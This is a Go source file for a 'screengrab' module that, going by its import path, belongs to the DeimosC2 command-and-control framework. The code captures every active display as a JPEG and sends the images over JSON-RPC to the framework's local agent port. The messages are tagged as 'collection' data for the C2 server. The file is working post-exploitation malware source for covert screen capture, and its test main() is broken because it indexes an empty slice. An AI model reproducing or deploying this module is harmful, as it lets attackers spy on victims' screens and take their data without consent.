package screengrab

import (
	"bytes"
	"image/jpeg"
	"log"
	"net"
	"net/rpc/jsonrpc"
	"time"

	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/modulescommon"
	"github.com/kbinani/screenshot"
)

//DllOptions is used for passed variables to DLLS
type DllOptions struct {
	Options []string
}

//RunModule runs the module
func RunModule(options DllOptions) {

	//CURRENTLY HARDCODED
	conn, err := net.Dial("tcp", "127.0.0.1:"+options.Options[0])
	if err != nil {
		log.Fatal("dialing:", err)
	}
	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}

		buf := new(bytes.Buffer)
		err = jpeg.Encode(buf, img, nil)
		sendData := buf.Bytes()
		sendon := modulescommon.ModuleCom{"", true, false, false, "screengrab", "collection", ".exe", sendData}

		var reply int
		err = client.Call("ModData.SendData", &sendon, &reply)
		if err != nil {
			log.Fatal("RPC error:", err)
		}

	}

	time.Sleep(5 * time.Second)

	//Once all the data hase been sent then we will tell the server to close the other half of the module
	sendon := modulescommon.ModuleCom{"", true, false, true, "screengrab", "collection", ".exe", nil}

	var reply int
	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

}

func main() {
	args := DllOptions{}
	args.Options[0] = "1234"
	RunModule(args)
}
